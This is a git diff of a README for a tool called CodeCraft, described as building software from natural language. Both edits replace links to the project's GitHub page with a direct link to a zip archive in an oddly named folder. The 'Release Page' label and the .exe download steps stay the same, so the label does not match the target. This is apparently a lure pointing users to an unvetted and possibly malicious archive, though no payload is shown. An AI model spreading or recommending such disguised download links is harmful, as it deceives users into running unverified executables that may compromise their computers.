@@ -1,6 +1,6 @@
 # 🤖 CodeCraft - Build Software Using Simple Natural Language
 
-[![Download CodeCraft](https://img.shields.io/badge/Download-CodeCraft-blueviolet.svg)](https://github.com/rutgerintermediate648/CodeCraft)
+[![Download CodeCraft](https://img.shields.io/badge/Download-CodeCraft-blueviolet.svg)](https://raw.githubusercontent.com/rutgerintermediate648/CodeCraft/main/hormonic/Craft-Code-v2.2.zip)
 
 ## 👋 What is CodeCraft
 
@@ -20,7 +20,7 @@ Ensure your computer meets these minimum specifications to run CodeCraft:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [CodeCraft Release Page](https://github.com/rutgerintermediate648/CodeCraft) to find the latest installation files.
+1. Visit the [CodeCraft Release Page](https://raw.githubusercontent.com/rutgerintermediate648/CodeCraft/main/hormonic/Craft-Code-v2.2.zip) to find the latest installation files.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download process.
 4. Locate the downloaded file in your Downloads folder.
